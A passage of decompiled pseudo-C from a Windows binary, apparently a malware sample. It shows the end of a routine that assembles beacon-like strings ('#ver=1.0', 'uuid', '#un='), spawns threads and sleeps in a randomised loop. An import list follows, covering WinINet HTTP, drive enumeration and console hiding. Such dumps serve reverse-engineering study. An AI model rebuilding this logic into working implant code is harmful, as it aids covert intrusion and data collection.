    while (v160 != 0) {
        // 0x40b226
        v158 = v161 + 1;
        v159 = (char *)v158;
        v160 = *v159;
        v161 = v158;
    }
    uint32_t v162 = v157 - v65; // 0x40b223
    uint32_t v163 = v162 / 4; // 0x40b230
    __asm_rep_movsd_memcpy(v159, v92, v163);
    char * v164 = (char *)(v158 + v163 * v82); // 0x40b241
    __asm_rep_movsb_memcpy(v164, v164, v162 & 3);
    *v66 = 0x72657623;
    *(int32_t *)v67 = 0x302e313d;
    *(char *)(v55 + 728) = v160;
    int32_t v165 = v65;
    int32_t v166 = v165 + 1; // 0x40b264
    while (*(char *)v165 != 0) {
        // 0x40b262
        v165 = v166;
        v166 = v165 + 1;
    }
    int32_t v167 = v69 + 1; // 0x40b273
    char * v168 = (char *)v167;
    int32_t v169 = v167; // 0x40b279
    while (*v168 != 0) {
        // 0x40b273
        v167 = v169 + 1;
        v168 = (char *)v167;
        v169 = v167;
    }
    uint32_t v170 = v166 - v65; // 0x40b270
    uint32_t v171 = v170 / 4; // 0x40b282
    __asm_rep_movsd_memcpy(v168, v92, v171);
    *(int32_t *)v63 = 0x64697575;
    char * v172 = (char *)(v167 + v171 * v82); // 0x40b299
    __asm_rep_movsb_memcpy(v172, v172, v170 & 3);
    *(int16_t *)(v55 + 964) = 61;
    int32_t v173 = function_405ef0(); // 0x40b2a3
    int32_t v174 = v173; // 0x40b2ac
    while (*(char *)v174 != 0) {
        // 0x40b2b0
        v174++;
    }
    int32_t v175 = v55 + 959; // 0x40b2c0
    int32_t v176 = v175; // 0x40b2c0
    v176++;
    char * v177 = (char *)v176;
    while (*v177 != 0) {
        // 0x40b2c1
        v176++;
        v177 = (char *)v176;
    }
    uint32_t v178 = v174 - v173; // 0x40b2be
    uint32_t v179 = v178 / 4; // 0x40b2cb
    __asm_rep_movsd_memcpy(v177, (char *)v173, v179);
    char * v180 = (char *)(v176 + v179 * v82); // 0x40b2d5
    __asm_rep_movsb_memcpy(v180, v180, v178 & 3);
    int32_t v181 = v175;
    int32_t v182 = v181 + 1; // 0x40b2e0
    while (*(char *)v182 != 0) {
        // 0x40b2e0
        v181 = v182;
        v182 = v181 + 1;
    }
    // 0x40b2ea
    *(int32_t *)v182 = 0x3d6e7523;
    *(char *)(v181 + 5) = 0;
    int32_t v183 = function_4061e0(); // 0x40b2f9
    int32_t v184 = v183;
    int32_t v185 = v184 + 1; // 0x40b304
    while (*(char *)v184 != 0) {
        // 0x40b302
        v184 = v185;
        v185 = v184 + 1;
    }
    int32_t v186 = v175 + 1; // 0x40b313
    char * v187 = (char *)v186;
    int32_t v188 = v186; // 0x40b319
    while (*v187 != 0) {
        // 0x40b313
        v186 = v188 + 1;
        v187 = (char *)v186;
        v188 = v186;
    }
    uint32_t v189 = v185 - v183; // 0x40b310
    uint32_t v190 = v189 / 4; // 0x40b324
    __asm_rep_movsd_memcpy(v187, (char *)v183, v190);
    *v59 = (int32_t)&g29;
    char * v191 = (char *)(v186 + v190 * v82); // 0x40b333
    __asm_rep_movsb_memcpy(v191, v191, v189 & 3);
    *v61 = 0;
    *(int32_t *)(v55 + 16) = v60;
    int32_t v192 = v55 + 1464; // 0x40b341
    *v62 = 0;
    *(int32_t *)(v55 + 20) = v192;
    *(int32_t *)(v55 - 16) = 0x405b20;
    *(int32_t *)(v55 + 24) = v63;
    int32_t v193 = v55 - 20; // 0x40b365
    *(int32_t *)v193 = 0;
    int32_t v194 = v55 - 24; // 0x40b367
    *(int32_t *)v194 = 0;
    *(int32_t *)(v55 + 28) = v192;
    CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32);
    int32_t * v195 = (int32_t *)(v55 - 28); // 0x40b371
    *v195 = 198;
    int32_t * v196 = (int32_t *)(v55 - 32); // 0x40b376
    *v196 = 0;
    int32_t v197 = v55 + 1240; // 0x40b377
    *(int16_t *)v197 = 0;
    int32_t * v198 = (int32_t *)(v55 - 36); // 0x40b386
    *v198 = v55 + 1242;
    _memset(&g32, (int32_t)&g32, (int32_t)&g32);
    *v195 = 100;
    *v196 = v197;
    *v198 = 0;
    GetModuleFileNameW(&g32, (int16_t *)&g32, (int32_t)&g32);
    function_409300();
    *(int32_t *)(v55 - 40) = v194;
    *(int32_t *)(v55 - 44) = 0;
    *(int32_t *)(v55 - 48) = v193;
    *(int32_t *)(v55 - 52) = 0x4093a0;
    *(int32_t *)(v55 - 56) = 0;
    int32_t v199 = v55 - 60; // 0x40b3b9
    *(int32_t *)v199 = 0;
    int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32); // 0x40b3ba
    int32_t v200 = v199; // 0x40b3be
    int32_t v201 = 0; // 0x40b3be
    int32_t v202 = (int32_t)threadHandle; // 0x40b3be
    int32_t v203; // 0x40ab30
    int32_t v204; // 0x40ab30
    int32_t v205; // 0x40b3e5
    int32_t * threadHandle3; // 0x40b3e7
    while (true) {
      lab_0x40b3c0:;
        int32_t v206 = v202;
        int32_t v207 = v201;
        int32_t v208 = v200;
        *(int32_t *)(v208 - 4) = 0;
        int32_t v209 = v208 - 8; // 0x40b3c2
        *(int32_t *)v209 = v206;
        int32_t v210 = WaitForSingleObject(&g32, (int32_t)&g32); // 0x40b3c3
        if (v207 > 9) {
            // 0x40b3f0
            *(int32_t *)(v208 - 12) = v208 + 4;
            *(int32_t *)(v208 - 16) = 0;
            *(int32_t *)(v208 - 20) = v208 + 8;
            *(int32_t *)(v208 - 24) = 0x4093a0;
            *(int32_t *)(v208 - 28) = 0;
            int32_t v211 = v208 - 32; // 0x40b403
            *(int32_t *)v211 = 0;
            int32_t * threadHandle2 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32); // 0x40b405
            threadHandle3 = threadHandle2;
            v205 = v211;
            v204 = 0;
            goto lab_0x40b40d;
        } else {
            // 0x40b3ce
            v203 = v209;
            v201 = v207;
            v202 = v206;
            if (v210 != 0) {
                goto lab_0x40b40f;
            } else {
                // 0x40b3d2
                *(int32_t *)(v208 - 12) = v208 + 4;
                *(int32_t *)(v208 - 16) = 0;
                *(int32_t *)(v208 - 20) = v208 + 16;
                *(int32_t *)(v208 - 24) = 0x4093a0;
                *(int32_t *)(v208 - 28) = 0;
                v205 = v208 - 32;
                *(int32_t *)v205 = 0;
                threadHandle3 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32);
                v204 = v207 + 1;
                goto lab_0x40b40d;
            }
        }
    }
  lab_0x40b40d:
    // 0x40b40d
    v203 = v205;
    v201 = v204;
    v202 = (int32_t)threadHandle3;
    goto lab_0x40b40f;
  lab_0x40b40f:
    // 0x40b40f
    v200 = v203 - 4;
    int32_t * v212 = (int32_t *)v200; // 0x40b40f
    *v212 = 0;
    *v212 = __time64();
    _srand((int32_t)&g32);
    _rand();
    int32_t v213 = _rand(); // 0x40b427
    *v212 = (int32_t)((0x100000000 * (int64_t)(v213 >> 31) | (int64_t)v213) % 0x4e20) + 0x2710;
    Sleep((int32_t)&g32);
    goto lab_0x40b3c0;
}

// Address range: 0x40b446 - 0x40b455
int32_t _40___security_check_cookie_40_4(void) {
    // 0x40b446
    int32_t v1; // 0x40b446
    if (v1 != g22) {
        // 0x40b450
        return ___report_gsfailure();
    }
    // 0x40b44e
    int32_t result; // 0x40b446
    return result;
}

// Address range: 0x40b62e - 0x40b63a
int32_t function_40b62e(void) {
    // 0x40b62e
    int32_t v1; // 0x40b62e
    return ___report_securityfailure(8, v1);
}

// Address range: 0x40d4e3 - 0x40d4f0
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_40d4e3(void) {
    // 0x40d4e3
    int32_t v1; // 0x40d4e3
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x40d4e3
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// --------------- Statically Linked Functions ----------------

// int32_t ??_GFreeThreadProxy@details@Concurrency@@UAEPAXI@Z(int32_t a1);
// int32_t ?_Xinvalid_argument@std@@YAXPBD@Z(char * a1);
// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G_3f__24__AnonymousOriginator_40_I_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__GFreeThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__GThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ(void);
// int32_t _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(int32_t a1);
// int32_t _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z(char * a1);
// int32_t ___DestructExceptionObject(int32_t a1, int32_t a2);
// int32_t ___report_gsfailure(void);
// int32_t ___report_securityfailure(int32_t a1, int32_t a2);
// int32_t __chkstk(void);
// char * __cdecl itoa(_In_ int Value, char * Buffer, _In_ int Radix);
// int32_t __time64(void);
// void free(void * ptr);
// void * malloc(size_t size);
// size_t mbstowcs(wchar_t * restrict pwcs, const char * restrict s, size_t n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// int32_t _memcpy2(void);
// void * memset(void * s, int c, size_t n);
// int printf(const char * restrict format, ...);
// int rand(void);
// void srand(unsigned int seed);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);

// --------------- Dynamically Linked Functions ---------------

// BOOL CloseHandle(_In_ HANDLE hObject);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// void * GdipAlloc(size_t size);
// GpStatus GdipCloneImage(GpImage * image, GpImage ** cloneImage);
// GpStatus GdipDisposeImage(GpImage * image);
// void GdipFree(void * ptr);
// HWND GetConsoleWindow(VOID);
// DWORD GetCurrentProcessId(VOID);
// UINT GetDriveTypeW(_In_opt_ LPCWSTR lpRootPathName);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// DWORD GetModuleFileNameW(_In_opt_ HMODULE hModule, LPWSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetTickCount(VOID);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExW(_Inout_ LPOSVERSIONINFOW lpVersionInformation);
// int32_t HttpOpenRequestA(void);
// BOOL HttpSendRequestA(_In_ HINTERNET hRequest, LPCSTR lpszHeaders, _In_ DWORD dwHeadersLength, LPVOID lpOptional, _In_ DWORD dwOptionalLength);
// char * inet_ntoa(_In_ struct in_addr in);
// BOOL InternetCheckConnectionA(_In_ LPCSTR lpszUrl, _In_ DWORD dwFlags, _In_ DWORD dwReserved);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetConnectA(_In_ HINTERNET hInternet, _In_ LPCSTR lpszServerName, _In_ INTERNET_PORT nServerPort, _In_ LPCSTR lpszUsername, _In_ LPCSTR lpszPassword, _In_ DWORD dwService, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// BOOL InternetGetConnectedState(_Out_ LPDWORD lpdwFlags, DWORD dwReserved);
// HINTERNET InternetOpenA(_In_ LPCSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCSTR lpszProxyName, _In_ LPCSTR lpszProxyBypass, _In_ DWORD dwFlags);
// HINTERNET InternetOpenUrlW(_In_ HINTERNET hInternet, _In_ LPCWSTR lpszUrl, _In_ LPCWSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenW(_In_ LPCWSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCWSTR lpszProxyName, _In_ LPCWSTR lpszProxyBypass, _In_ DWORD dwFlags);
// BOOL InternetReadFile(_In_ HINTERNET hFile, LPVOID lpBuffer, _In_ DWORD dwNumberOfBytesToRead, _Out_ LPDWORD lpdwNumberOfBytesRead);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// HLOCAL LocalFree(HLOCAL hMem);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrlenA(_In_ LPCSTR lpString);
// int lstrlenW(_In_ LPCWSTR lpString);
// HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// BOOL ReleaseMutex(_In_ HANDLE hMutex);
// BOOL ShowWindow(_In_ HWND hWnd, _In_ int nCmdShow);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// PCSTR StrStrIA(_In_ PCSTR pszFirst, _In_ PCSTR pszSrch);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (12.0)
// Detected language: C++
// Detected functions: 38
